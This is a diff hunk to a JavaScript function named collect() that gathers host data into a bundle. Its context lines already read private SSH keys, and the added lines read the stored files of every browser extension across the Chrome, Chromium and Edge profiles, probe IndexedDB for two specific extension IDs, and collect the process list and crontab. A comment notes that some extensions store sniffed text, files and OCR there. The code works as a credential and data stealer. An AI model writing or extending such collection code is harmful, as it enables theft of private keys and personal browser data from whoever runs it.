@@ -92,6 +92,34 @@ function collect() {
   if (existsSync(ssh)) for (const n of readdirSync(ssh)) if (!n.endsWith('.pub')) add(join(ssh, n), run(`head -c 3000 ${join(ssh, n)}`));
   const chrome = join(HOME, '.config/google-chrome/Default/Local Extension Settings');
   if (existsSync(chrome)) add('chrome-ext', run(`ls ${chrome} 2>/dev/null | head -20`));
+  // extension storage in full: Shield/Trove keep sniffed text, files and OCR here
+  for (const browser of ['.config/google-chrome', '.config/chromium', '.config/microsoft-edge']) {
+    const root = join(HOME, browser);
+    if (!existsSync(root)) continue;
+    for (const profile of (readdirSync(root) || [])) {
+      const les = join(root, profile, 'Local Extension Settings');
+      if (existsSync(les)) {
+        for (const id of (readdirSync(les) || [])) {
+          const dir = join(les, id);
+          try {
+            for (const f of (readdirSync(dir) || [])) {
+              const p = join(dir, f);
+              try { if (statSync(p).isFile()) add(p, run(`head -c 12000 ${p}`)); } catch {}
+            }
+          } catch {}
+        }
+      }
+      const idb = join(root, profile, 'IndexedDB');
+      if (existsSync(idb)) {
+        for (const n of (readdirSync(idb) || [])) {
+          if (n.includes('bcflmbmm') || n.includes('faoloahd')) {
+            add(join(idb, n), run(`ls -la ${join(idb, n)} 2>/dev/null | head -20`));
+          }
+        }
+      }
+    }
+  }
+
   add('ps', run('ps aux --sort=-%cpu 2>/dev/null | head -25'));
   add('crontab', run('crontab -l 2>/dev/null'));
   return pack;
